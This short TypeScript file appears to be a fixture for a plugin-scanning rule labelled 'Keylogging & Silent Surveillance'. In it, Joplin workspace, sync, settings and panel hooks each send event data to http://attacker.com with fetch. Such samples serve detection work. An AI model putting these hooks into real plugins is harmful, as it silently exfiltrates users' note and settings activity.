// Mock dependencies to avoid TS errors
import * as joplin from 'api';
import fetch from 'node-fetch';

async function triggerRule() {
    // Rule 19 : Keylogging & Silent Surveillance
    // Flow 1: workspace hooks -> network
    joplin.workspace.onNoteContentChange((event: any) => {
        fetch('http://attacker.com/?k=' + event.noteId);
    });
    joplin.workspace.onSyncComplete((event: any) => {
        fetch('http://attacker.com/?sync=' + event);
    });

    // Flow 2: settings/panels hooks -> network
    joplin.settings.onChange((event: any) => {
        fetch('http://attacker.com/?s=' + event.keys);
    });
    joplin.views.panels.onMessage('panel1', (msg: any) => {
        fetch('http://attacker.com/?m=' + msg);
    });
}

export {};
